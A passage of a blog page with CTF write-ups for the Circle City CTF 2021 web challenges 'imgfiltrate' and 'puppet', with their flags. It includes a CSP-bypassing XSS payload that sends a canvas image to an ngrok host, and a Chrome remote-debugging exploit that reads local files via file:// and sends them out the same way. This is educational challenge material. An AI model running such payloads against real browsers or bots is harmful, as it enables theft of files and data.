+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>CCC{maybe_1_sh0uldv3d_us3d_P0ST_in5t3ad_of_G3T}
+</span></code></pre>
+<h1 id="imgfiltrate-web">imgfiltrate (web)</h1>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>Can you yoink an image from the admin page?
+</span></code></pre>
+<p><a href="https://github.com/b01lers/circle-city-ctf-2021/raw/main/web/imgfiltrate/dist/imgfiltrate.zip">imgfiltrate</a></p>
+<p>We get an "admin bot" which will visit an arbitrary webpage and a webpage which will provide the flag as an image. This page is vulnerable to css by way of GET parameter. The idea is to write that image to a canvas and then exfiltrate the data from the canvas. There is CSP, but the script nonce is static and in the website so it's trivial to bypass.</p>
+<pre data-lang="js" style="background-color:#212733;color:#ccc9c2;" class="language-js "><code class="language-js" data-lang="js"><span style="color:#f29e74;">&lt;</span><span>script nonce</span><span style="color:#f29e74;">=</span><span style="color:#bae67e;">&quot;70861e83ad7f1863b3020799df93e450&quot;</span><span style="color:#f29e74;">&gt;
+</span><span>window</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">onload </span><span style="color:#f29e74;">= </span><span>(</span><span style="color:#ffcc66;">event</span><span>) </span><span style="color:#ffa759;">=&gt; </span><span>{
+</span><span>    </span><span style="color:#ffa759;">var </span><span>img </span><span style="color:#f29e74;">= new </span><span style="color:#73d0ff;">Image</span><span>()</span><span style="color:#ccc9c2cc;">,
+</span><span>    canvas </span><span style="color:#f29e74;">= </span><span>document</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">createElement</span><span>(</span><span style="color:#bae67e;">&quot;canvas&quot;</span><span>)</span><span style="color:#ccc9c2cc;">,
+</span><span>    ctx </span><span style="color:#f29e74;">= </span><span>canvas</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">getContext</span><span>(</span><span style="color:#bae67e;">&quot;2d&quot;</span><span>)</span><span style="color:#ccc9c2cc;">,
+</span><span>    src </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&quot;/flag.php&quot;</span><span style="color:#ccc9c2cc;">;
+</span><span>    img</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">onload </span><span style="color:#f29e74;">= </span><span style="color:#ffa759;">function</span><span>() {
+</span><span>      canvas</span><span style="color:#f29e74;">.</span><span>width </span><span style="color:#f29e74;">= </span><span>img</span><span style="color:#f29e74;">.</span><span>width</span><span style="color:#ccc9c2cc;">;
+</span><span>      canvas</span><span style="color:#f29e74;">.</span><span>height </span><span style="color:#f29e74;">= </span><span>img</span><span style="color:#f29e74;">.</span><span>height</span><span style="color:#ccc9c2cc;">;
+</span><span>      ctx</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">drawImage</span><span>(img</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">0</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>      scrpt </span><span style="color:#f29e74;">= </span><span>document</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">createElement</span><span>(</span><span style="color:#bae67e;">&quot;script&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>      scrpt</span><span style="color:#f29e74;">.</span><span>src </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&#39;http://50e4b12740bd.ngrok.io?c=&#39; </span><span style="color:#f29e74;">+ </span><span>canvas</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">toDataURL</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>      scrpt</span><span style="color:#f29e74;">.</span><span>nonce </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&quot;70861e83ad7f1863b3020799df93e450&quot;
+</span><span>      document</span><span style="color:#f29e74;">.</span><span>body</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">appendChild</span><span>(scrpt)
+</span><span>    }
+</span><span>  img</span><span style="color:#f29e74;">.</span><span>src </span><span style="color:#f29e74;">= </span><span>src</span><span style="color:#ccc9c2cc;">;
+</span><span>  document</span><span style="color:#f29e74;">.</span><span>body</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">appendChild</span><span>(canvas)</span><span style="color:#ccc9c2cc;">;
+</span><span>
+</span><span>}
+</span><span style="color:#f29e74;">&lt;/</span><span>script</span><span style="color:#f29e74;">&gt;
+</span></code></pre>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>CCC{c4nvas_b64}
+</span></code></pre>
+<h1 id="puppet-web">puppet (web)</h1>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>The flag has a random name in ~/Documents/. Pwn my browser:
+</span></code></pre>
+<p><a href="https://github.com/b01lers/circle-city-ctf-2021/raw/main/web/puppet/dist/puppet.zip">puppet</a></p>
+<pre data-lang="js" style="background-color:#212733;color:#ccc9c2;" class="language-js "><code class="language-js" data-lang="js"><span style="color:#ffa759;">const </span><span>browser </span><span style="color:#f29e74;">= </span><span style="color:#ffa759;">await </span><span>puppeteer</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">launch</span><span>({
+</span><span>  dumpio</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ffcc66;">true</span><span style="color:#ccc9c2cc;">,
+</span><span>  args</span><span style="color:#ccc9c2cc;">: </span><span>[
+</span><span>    </span><span style="color:#bae67e;">&#39;--disable-web-security&#39;</span><span style="color:#ccc9c2cc;">,
+</span><span>    </span><span style="color:#bae67e;">&#39;--user-data-dir=/tmp/chrome&#39;</span><span style="color:#ccc9c2cc;">,
+</span><span>    </span><span style="color:#bae67e;">&#39;--remote-debugging-port=5000&#39;</span><span style="color:#ccc9c2cc;">,
+</span><span>    </span><span style="color:#bae67e;">&#39;--disable-dev-shm-usage&#39;</span><span style="color:#ccc9c2cc;">, </span><span style="font-style:italic;color:#5c6773;">// Docker stuff
+</span><span>    </span><span style="color:#bae67e;">&#39;--js-flags=--jitless&#39; </span><span style="font-style:italic;color:#5c6773;">// No Chrome n-days please
+</span><span>  ]
+</span><span>})
+</span></code></pre>
+<p>No same origin policy (--disable-web-security) and remote debugging is quite the combo. By remotely controlling the browser we can use the file:// protocol, making it possible to enumerate files and then leak them. Pardon my gross exploit, I was running on very little sleep and I don't have it in me to clean it up now. I just hosted it as an HTML page and pointed the admin bot towards it.</p>
+<pre data-lang="js" style="background-color:#212733;color:#ccc9c2;" class="language-js "><code class="language-js" data-lang="js"><span style="color:#ffa759;">const </span><span style="color:#ffd580;">blobToBase64 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">blob </span><span style="color:#ffa759;">=&gt; </span><span>{
+</span><span>  </span><span style="color:#ffa759;">const </span><span>reader </span><span style="color:#f29e74;">= new </span><span style="color:#73d0ff;">FileReader</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>  reader</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">readAsDataURL</span><span>(blob)</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">return </span><span style="color:#f29e74;">new </span><span style="color:#73d0ff;">Promise</span><span>(</span><span style="color:#ffcc66;">resolve </span><span style="color:#ffa759;">=&gt; </span><span>{
+</span><span>    reader</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">onloadend </span><span style="color:#f29e74;">= </span><span>() </span><span style="color:#ffa759;">=&gt; </span><span>{
+</span><span>      </span><span style="color:#ffd580;">resolve</span><span>(reader</span><span style="color:#f29e74;">.</span><span>result)</span><span style="color:#ccc9c2cc;">;
+</span><span>    }</span><span style="color:#ccc9c2cc;">;
+</span><span>  })</span><span style="color:#ccc9c2cc;">;
+</span><span>}</span><span style="color:#ccc9c2cc;">;
+</span><span>
+</span><span style="color:#ffd580;">fetch</span><span>(</span><span style="color:#bae67e;">&quot;http://localhost:5000/json/new?file:///home/inmate/Documents&quot;</span><span>)
+</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">then</span><span>((</span><span style="color:#ffcc66;">res</span><span>) </span><span style="color:#ffa759;">=&gt; </span><span>res</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">blob</span><span>())
+</span><span>
+</span><span style="color:#ffd580;">fetch</span><span>(</span><span style="color:#bae67e;">&quot;http://localhost:5000/json/list&quot;</span><span>)
+</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">then</span><span>((</span><span style="color:#ffcc66;">res</span><span>) </span><span style="color:#ffa759;">=&gt; </span><span>res</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">json</span><span>())
+</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">then</span><span>((</span><span style="color:#ffcc66;">json</span><span>) </span><span style="color:#ffa759;">=&gt; </span><span>{
+</span><span>	found </span><span style="color:#f29e74;">= </span><span>json</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">find</span><span>(</span><span style="color:#ffcc66;">ele </span><span style="color:#ffa759;">=&gt; </span><span>ele</span><span style="color:#f29e74;">.</span><span>url </span><span style="color:#f29e74;">== </span><span style="color:#bae67e;">&quot;file:///home/inmate/Documents&quot;</span><span>)
+</span><span>	window</span><span style="color:#f29e74;">.</span><span>ws </span><span style="color:#f29e74;">= new </span><span style="color:#73d0ff;">WebSocket</span><span>(found</span><span style="color:#f29e74;">.</span><span>webSocketDebuggerUrl)
+</span><span>	ws</span><span style="color:#f29e74;">.</span><span>onerror </span><span style="color:#f29e74;">= </span><span>(</span><span style="color:#ffcc66;">e</span><span style="color:#ffa759;">=&gt;</span><span>{document</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">writeln</span><span>(</span><span style="color:#bae67e;">&#39;error&#39;</span><span>)})
+</span><span>	ws</span><span style="color:#f29e74;">.</span><span>onmessage </span><span style="color:#f29e74;">= </span><span>(</span><span style="color:#ffcc66;">e</span><span style="color:#ffa759;">=&gt;</span><span>{
+</span><span>
+</span><span>	  </span><span style="color:#ffd580;">fetch</span><span>(</span><span style="color:#bae67e;">&quot;http://6c3d5682e207.ngrok.io?onmsg=&quot; </span><span style="color:#f29e74;">+ </span><span>e</span><span style="color:#f29e74;">.</span><span>data)</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">then</span><span>((</span><span style="color:#ffcc66;">r</span><span>) </span><span style="color:#ffa759;">=&gt; </span><span style="font-style:italic;color:#5ccfe6;">console</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">log</span><span>(r))
+</span><span>	  </span><span style="color:#ffa759;">var </span><span>match </span><span style="color:#f29e74;">= </span><span>e</span><span style="color:#f29e74;">.</span><span>data</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">match</span><span>(</span><span style="color:#95e6cb;">/(flag_</span><span style="color:#ffcc66;">.</span><span style="color:#f29e74;">*?</span><span style="color:#95e6cb;">\.txt)/</span><span style="color:#ffa759;">g</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	  </span><span style="color:#ffd580;">fetch</span><span>(</span><span style="color:#bae67e;">&quot;http://6c3d5682e207.ngrok.io?match=&quot; </span><span style="color:#f29e74;">+ </span><span>match[</span><span style="color:#ffcc66;">0</span><span>] )</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">then</span><span>((</span><span style="color:#ffcc66;">r</span><span>) </span><span style="color:#ffa759;">=&gt; </span><span>{
+</span><span>
+</span><span>	  	</span><span style="font-style:italic;color:#5ccfe6;">console</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">log</span><span>(r)
+</span><span>	  })
+</span><span>	  </span><span style="color:#ffa759;">if </span><span>(match) {
+</span><span>	  	ws</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">send</span><span>(</span><span style="font-style:italic;color:#f29e74;">JSON</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">stringify</span><span>({
+</span><span>		  id</span><span style="color:#ccc9c2cc;">:</span><span style="color:#ffcc66;">4</span><span style="color:#ccc9c2cc;">,
+</span><span>		  method</span><span style="color:#ccc9c2cc;">:</span><span style="color:#bae67e;">&quot;Page.navigate&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>		  params</span><span style="color:#ccc9c2cc;">:</span><span>{
+</span><span>		  	url</span><span style="color:#ccc9c2cc;">:</span><span style="color:#bae67e;">&quot;view-source:file:///home/inmate/Documents/&quot; </span><span style="color:#f29e74;">+ </span><span>match[</span><span style="color:#ffcc66;">0</span><span>]
+</span><span>		  }
+</span><span>		}))
+</span><span>		</span><span style="font-style:italic;color:#5c6773;">// I call this one the &quot;i forgot setInterval existed&quot;
+</span><span>		</span><span style="color:#ffa759;">for</span><span>(</span><span style="color:#ffa759;">var </span><span>i </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">; </span><span>i </span><span style="color:#f29e74;">&lt; </span><span style="color:#ffcc66;">100000</span><span style="color:#ccc9c2cc;">; </span><span>i</span><span style="color:#f29e74;">++</span><span>) {
+</span><span>			</span><span style="font-style:italic;color:#5ccfe6;">console</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">log</span><span>(</span><span style="color:#bae67e;">&quot;hi&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>		}
+</span><span>		ws</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">send</span><span>(</span><span style="font-style:italic;color:#f29e74;">JSON</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">stringify</span><span>({
+</span><span>		  id</span><span style="color:#ccc9c2cc;">:</span><span style="color:#ffcc66;">5</span><span style="color:#ccc9c2cc;">,
+</span><span>		  method</span><span style="color:#ccc9c2cc;">:</span><span style="color:#bae67e;">&quot;Runtime.evaluate&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>		  params</span><span style="color:#ccc9c2cc;">:</span><span>{
+</span><span>		  	expression</span><span style="color:#ccc9c2cc;">:</span><span style="color:#bae67e;">&quot;document.documentElement.outerHTML&quot;
+</span><span>		  }
+</span><span>		}))
+</span><span>		}
+</span><span>		
+</span><span>	})
+</span><span>
+</span><span>	ws</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">onopen </span><span style="color:#f29e74;">= </span><span>()</span><span style="color:#ffa759;">=&gt;</span><span>{
+</span><span>
+</span><span>		</span><span style="font-style:italic;color:#5c6773;">// I call this one the &quot;i forgot setInterval existed&quot;
+</span><span>		</span><span style="color:#ffa759;">for</span><span>(</span><span style="color:#ffa759;">var </span><span>i </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">; </span><span>i </span><span style="color:#f29e74;">&lt; </span><span style="color:#ffcc66;">1000</span><span style="color:#ccc9c2cc;">; </span><span>i</span><span style="color:#f29e74;">++</span><span>) {
+</span><span>			</span><span style="font-style:italic;color:#5ccfe6;">console</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">log</span><span>(</span><span style="color:#bae67e;">&quot;hi&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>		}
+</span><span>		ws</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">send</span><span>(</span><span style="font-style:italic;color:#f29e74;">JSON</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">stringify</span><span>({
+</span><span>		  id</span><span style="color:#ccc9c2cc;">:</span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">,
+</span><span>		  method</span><span style="color:#ccc9c2cc;">:</span><span style="color:#bae67e;">&quot;Runtime.evaluate&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>		  params</span><span style="color:#ccc9c2cc;">:</span><span>{
+</span><span>		  	expression</span><span style="color:#ccc9c2cc;">:</span><span style="color:#bae67e;">&quot;document.documentElement.outerHTML&quot;
+</span><span>		  }
+</span><span>		}))
+</span><span>		ws</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">send</span><span>(</span><span style="font-style:italic;color:#f29e74;">JSON</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">stringify</span><span>({
+</span><span>		  id</span><span style="color:#ccc9c2cc;">:</span><span style="color:#ffcc66;">2</span><span style="color:#ccc9c2cc;">,
+</span><span>		  method</span><span style="color:#ccc9c2cc;">:</span><span style="color:#bae67e;">&quot;Runtime.evaluate&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>		  params</span><span style="color:#ccc9c2cc;">:</span><span>{
+</span><span>		  	expression</span><span style="color:#ccc9c2cc;">:</span><span style="color:#bae67e;">&quot;document.documentElement.outerHTML&quot;
+</span><span>		  }
+</span><span>		}))
+</span><span>		ws</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">send</span><span>(</span><span style="font-style:italic;color:#f29e74;">JSON</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">stringify</span><span>({
+</span><span>		  id</span><span style="color:#ccc9c2cc;">:</span><span style="color:#ffcc66;">3</span><span style="color:#ccc9c2cc;">,
+</span><span>		  method</span><span style="color:#ccc9c2cc;">:</span><span style="color:#bae67e;">&quot;Runtime.evaluate&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>		  params</span><span style="color:#ccc9c2cc;">:</span><span>{
+</span><span>		  	expression</span><span style="color:#ccc9c2cc;">:</span><span style="color:#bae67e;">&quot;document.documentElement.outerHTML&quot;
+</span><span>		  }
+</span><span>		}))
+</span><span>
+</span><span>	}
+</span><span>	</span><span style="color:#ffa759;">return </span><span>json
+</span><span>})
+</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">then</span><span>((</span><span style="color:#ffcc66;">blob</span><span>) </span><span style="color:#ffa759;">=&gt; </span><span style="font-style:italic;color:#f29e74;">JSON</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">stringify</span><span>(blob))
+</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">then</span><span>((</span><span style="color:#ffcc66;">blob</span><span>) </span><span style="color:#ffa759;">=&gt; </span><span style="color:#ffd580;">btoa</span><span>(blob))
+</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">then</span><span>((</span><span style="color:#ffcc66;">b64</span><span>) </span><span style="color:#ffa759;">=&gt; </span><span>{
+</span><span>	</span><span style="font-style:italic;color:#5ccfe6;">console</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">log</span><span>(b64)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#ffd580;">fetch</span><span>(</span><span style="color:#bae67e;">&quot;http://6c3d5682e207.ngrok.io?c=&quot; </span><span style="color:#f29e74;">+ </span><span>b64)</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">then</span><span>((</span><span style="color:#ffcc66;">r</span><span>) </span><span style="color:#ffa759;">=&gt; </span><span style="font-style:italic;color:#5ccfe6;">console</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">log</span><span>(r))
+</span><span>
+</span><span>})
+</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">catch</span><span>((</span><span style="color:#ffcc66;">err</span><span>) </span><span style="color:#ffa759;">=&gt; </span><span style="font-style:italic;color:#5ccfe6;">console</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">log</span><span>(err))
+</span></code></pre>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>CCC{1f_0nly_th3r3_w4s_X55_0n_th3_d3vt00ls_p4g3}
+</span></code></pre>
+
+    </div>
+
+    
+    <div class="article-info">
+        
+        <div class="article-date">13 June 2021</div>
+        
+        <div class="article-taxonomies">
+            
+            
+                <ul class="article-tags">
+                    
+                    <li><a href="https://tsheinen.github.io/tags/ctf-writeups/">#ctf-writeups</a></li>
+                    
+                </ul>
+            
+        </div>
+    </div>
+
+</article>
+
+<script>
+window.onscroll = function() {
+    if (window.innerHeight + window.pageYOffset >= document.body.offsetHeight) {
+        var count = 200;
+        var defaults = {
+          origin: { y: 0.7 }
+        };
+
+        function fire(particleRatio, opts) {
+          confetti(Object.assign({}, defaults, opts, {
+            particleCount: Math.floor(count * particleRatio)
+          }));
+        }
+
+        fire(0.25, {
+          spread: 26,
+          startVelocity: 55,
+        });
+        fire(0.2, {
+          spread: 60,
+        });
+        fire(0.35, {
+          spread: 100,
+          decay: 0.91,
+          scalar: 0.8
+        });
+        fire(0.1, {
+          spread: 120,
+          startVelocity: 25,
+          decay: 0.92,
+          scalar: 1.2
+        });
+        fire(0.1, {
+          spread: 120,
+          startVelocity: 45,
+        });
+    }
+}
+</script>
+<script type="text/javascript" src="/js/navbar.js"></script>
+
+
+        </main>
+        <footer>
+            
+            
+        </footer>
+    </div>
+
+
+
+    <details data-popover="up" style="right: 20px;top: 20px;">
+      <summary>
+		  <svg class="paint-roller" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="paint-roller" class="svg-inline--fa fa-paint-roller fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M416 128V32c0-17.67-14.33-32-32-32H32C14.33 0 0 14.33 0 32v96c0 17.67 14.33 32 32 32h352c17.67 0 32-14.33 32-32zm32-64v128c0 17.67-14.33 32-32 32H256c-35.35 0-64 28.65-64 64v32c-17.67 0-32 14.33-32 32v128c0 17.67 14.33 32 32 32h64c17.67 0 32-14.33 32-32V352c0-17.67-14.33-32-32-32v-32h160c53.02 0 96-42.98 96-96v-64c0-35.35-28.65-64-64-64z"/></svg>
+      </summary>
+      <div class="swatch-container">
+          
+            <div class="swatch-child" onclick="setTheme('Dark')">
+                <div style="text-align: center;">
+                  <div data-theme=Dark class="swatch">
+                    <div style="height: 100%; width:25%; background-color: var(--background-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--foreground-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color-alt, #000000)"></div>
+                  </div>
+                  <span style="color:  var(--background-color, #000000)"> Dark </span>
+              </div>
+            </div>
+          
+            <div class="swatch-child" onclick="setTheme('Light')">
+                <div style="text-align: center;">
+                  <div data-theme=Light class="swatch">
+                    <div style="height: 100%; width:25%; background-color: var(--background-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--foreground-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color-alt, #000000)"></div>
+                  </div>
+                  <span style="color:  var(--background-color, #000000)"> Light </span>
+              </div>
+            </div>
+          
+      </div>
+    </details>
+
+    <!-- Cloudflare Web Analytics -->
+    <script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "1e533cda4e344b0bb7c6bf7aef70a519"}'></script>
+    <!-- End Cloudflare Web Analytics -->
+
+    <script type="text/javascript" src="https://tsheinen.github.io/elasticlunr.min.js"></script>
+    <script type="text/javascript" src="https://tsheinen.github.io/search_index.en.js"></script>
+    <script type="text/javascript" src="https://tsheinen.github.io/js/search.js"></script>
+</body>
+</html>
